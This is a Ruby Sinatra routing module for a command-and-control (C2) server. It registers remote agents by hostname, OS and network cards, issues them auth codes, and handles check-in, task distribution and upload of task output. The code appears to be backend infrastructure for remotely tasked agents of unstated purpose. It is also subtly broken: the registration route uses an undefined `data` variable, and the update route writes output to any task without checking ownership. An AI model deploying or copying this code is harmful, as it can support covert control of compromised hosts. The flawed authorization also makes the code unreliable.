module Routing
	module C2
		def self.registered(app) 

			app.before '/c2/:id/*' do
				pass if request.path_info == '/c2/initial'
				@agent = Agent.first(id: params[:id])
				if @agent.nil? or not @agent.authenticate(params[:auth_code])
					redirect '/c2/error'
				end
			end
			
			app.get '/c2/error' do
				jbuilder :error_json
			end

			app.post '/c2/initial' do
				@secret = ""
				if not @agent = Agent.first(mac: params[:mac])
					@secret = SecureRandom.uuid

					@data = JSON.parse(params[:data])

					@agent = Agent.create(
						name: data["hostname"],
						agent_type: data["agent_type"],
						operating_system: data["os"],
						auth_code: @secret
					)
					@data["nics"].each do |nic|
						Nic.create(
							hw_addr: nic["hw_addr"],
							last_ip: nic["ip"],
							agent: @agent
						)
					end
				end
				jbuilder :initial_json
			end	

			app.post '/c2/:id/checkin' do
				@task_cnt = Task.count( open: true, agent: @agent )
				jbuilder :checkin_json
			end

			app.post '/c2/:id/tasking' do
				@tasks = Task.all( open: true, agent: @agent )
				@tasks.each do |task|
					task.open = false
					task.save
				end
				jbuilder :tasking_json
			end

			app.post '/c2/:id/update' do
				data = JSON.parse(params[:tasks])
				@saved_tasks = []
				data["tasks"].each do |task|
					t = Task.first(id: task["id"])
					t.output = task["output"]
					if t.save
						@saved_tasks << t
					end
				end
				jbuilder :update_json
			end
		end
	end
end
